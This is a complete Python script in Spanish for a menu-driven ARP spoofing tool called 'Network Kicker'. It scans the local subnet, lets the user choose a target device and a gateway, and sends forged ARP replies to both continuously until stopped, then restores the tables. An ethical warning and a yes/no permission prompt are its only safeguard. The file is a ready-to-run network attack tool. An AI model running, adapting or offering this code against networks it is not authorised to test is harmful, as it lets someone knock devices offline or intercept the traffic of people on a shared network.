#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Network Kicker - Versión con Menú Interactivo
Educational ARP Spoofing Tool with Console Menu

USO ÉTICO: Solo en redes con permiso explícito.
"""

import os
import sys
import time
import logging
import signal
from scapy.all import ARP, send, srp, Ether, conf
import ipaddress

# Configuración de logs
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("network_kicker.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Variables globales para control
running = True
target_ip = None
gateway_ip = None
target_mac = None
gateway_mac = None
iface = conf.iface

def signal_handler(sig, frame):
    global running
    logger.info(" Interrupción recibida. Restaurando tablas ARP...")
    running = False

def is_root():
    return os.geteuid() == 0

def validate_ip(ip_str):
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def get_default_gateway():
    try:
        local_ip = conf.route.route("0.0.0.0")[1]
        net = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
        return str(net.network_address + 1)
    except Exception:
        return None

def scan_network(timeout=2):
    logger.info("Escaneando la red local... (puede tardar unos segundos)")
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),
                     timeout=timeout, iface=iface, verbose=False)
        hosts = [(res[1].psrc, res[1].hwsrc) for res in ans]
        if not hosts:
            logger.warning("No se encontraron dispositivos (¿otra subred?)")
            return []
        logger.info("\nDispositivos en la red:")
        for i, (ip, mac) in enumerate(hosts, 1):
            print(f"  {i}. {ip} — {mac}")
        return hosts
    except Exception as e:
        logger.error(f"Error al escanear: {e}")
        return []

def get_mac(ip, timeout=2):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                     timeout=timeout, iface=iface, verbose=False)
        return ans[0][1].hwsrc if ans else None
    except Exception:
        return None

def spoof(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, iface=iface, verbose=False)

def restore_arp():
    global target_ip, target_mac, gateway_ip, gateway_mac
    if not all([target_ip, target_mac, gateway_ip, gateway_mac]):
        return
    logger.info("Restaurando tablas ARP...")
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac),
         iface=iface, count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac),
         iface=iface, count=5, verbose=False)
    logger.info("✅ Tablas ARP restauradas.")

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_menu():
    print("\n" + "="*50)
    print("        🛡️  NETWORK KICKER - Menú Principal")
    print("="*50)
    print("1. 🌐 Escanear red local")
    print("2. 🎯 Seleccionar dispositivo objetivo (por IP o número del escaneo)")
    print("3. 🚪 Establecer gateway (o autodetectar)")
    print("4. ⚙️  Ver configuración actual")
    print("5. 💥 Iniciar ataque ARP Spoofing")
    print("6. 🔁 Restaurar tablas ARP manualmente")
    print("7. 📜 Ver último log")
    print("8. ❌ Salir")
    print("="*50)

def get_user_choice():
    try:
        return int(input("\nElige una opción (1-8): "))
    except ValueError:
        return -1

def main():
    global running, target_ip, gateway_ip, target_mac, gateway_mac, iface

    if not is_root():
        print("[ERROR] Este script debe ejecutarse como root.")
        sys.exit(1)

    # Advertencia ética obligatoria
    clear_screen()
    print("\n⚠️  ADVERTENCIA ÉTICA Y LEGAL")
    print("Este script es SOLO para uso educativo en redes que controlás o tienes permiso explícito para probar.")
    confirm = input("¿Confirmas que tienes permiso? (sí/no): ").strip().lower()
    if confirm not in ("sí", "si", "yes", "y"):
        print("Operación cancelada.")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    while True:
        clear_screen()
        show_menu()
        choice = get_user_choice()

        if choice == 1:
            hosts = scan_network()
            input("\nPresiona ENTER para continuar...")

        elif choice == 2:
            hosts = scan_network()
            if not hosts:
                ip_input = input("Ingresa manualmente la IP del objetivo: ").strip()
                if validate_ip(ip_input):
                    target_ip = ip_input
                    print(f"✅ Objetivo establecido: {target_ip}")
                else:
                    print("❌ IP inválida.")
            else:
                try:
                    sel = int(input("Selecciona el número del dispositivo: ")) - 1
                    if 0 <= sel < len(hosts):
                        target_ip, target_mac = hosts[sel]
                        print(f"✅ Objetivo seleccionado: {target_ip} ({target_mac})")
                    else:
                        print("❌ Número fuera de rango.")
                except ValueError:
                    print("❌ Entrada no válida.")
            input("Presiona ENTER para continuar...")

        elif choice == 3:
            auto_gw = get_default_gateway()
            print(f"\nGateway detectado automáticamente: {auto_gw or 'Ninguno'}")
            gw_input = input("Ingresa IP del gateway (deja en blanco para usar el detectado): ").strip()
            gateway_ip = gw_input if gw_input else auto_gw
            if gateway_ip and validate_ip(gateway_ip):
                print(f"✅ Gateway establecido: {gateway_ip}")
            else:
                print("❌ IP de gateway inválida.")
                gateway_ip = None
            input("Presiona ENTER para continuar...")

        elif choice == 4:
            print("\n🔧 Configuración actual:")
            print(f"   Interfaz: {iface}")
            print(f"   Objetivo: {target_ip or 'No establecido'}")
            print(f"   Gateway:  {gateway_ip or 'No establecido'}")
            input("\nPresiona ENTER para continuar...")

        elif choice == 5:
            if not target_ip or not gateway_ip:
                print("\n❌ Debes establecer objetivo y gateway primero.")
                input("Presiona ENTER para continuar...")
                continue

            if not target_mac:
                print("Obteniendo MAC del objetivo...")
                target_mac = get_mac(target_ip)
                if not target_mac:
                    print("❌ No se pudo obtener la MAC del objetivo.")
                    input("Presiona ENTER para continuar...")
                    continue

            if not gateway_mac:
                print("Obteniendo MAC del gateway...")
                gateway_mac = get_mac(gateway_ip)
                if not gateway_mac:
                    print("❌ No se pudo obtener la MAC del gateway.")
                    input("Presiona ENTER para continuar...")
                    continue

            print("\n💥 Iniciando ARP Spoofing...")
            print("Envía paquetes continuamente. Presiona Ctrl+C para detener y restaurar.")
            time.sleep(2)
            sent = 0
            running = True
            try:
                while running:
                    spoof(target_ip, target_mac, gateway_ip)
                    spoof(gateway_ip, gateway_mac, target_ip)
                    sent += 2
                    print(f"  Paquetes enviados: {sent}", end="\r")
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
            finally:
                restore_arp()
            input("\n\nPresiona ENTER para continuar...")

        elif choice == 6:
            restore_arp()
            input("Presiona ENTER para continuar...")

        elif choice == 7:
            try:
                with open("network_kicker.log", "r", encoding="utf-8") as f:
                    lines = f.readlines()
                    print("\n📜 Últimas 5 líneas del log:")
                    for line in lines[-5:]:
                        print(line.strip())
            except FileNotFoundError:
                print("📝 Aún no se ha generado ningún log.")
            input("\nPresiona ENTER para continuar...")

        elif choice == 8:
            print("\n👋 Saliendo... ¡Usa el poder con responsabilidad!")
            sys.exit(0)

        else:
            print("\n❌ Opción inválida. Elige un número del 1 al 8.")
            input("Presiona ENTER para continuar...")

if __name__ == "__main__":
    main()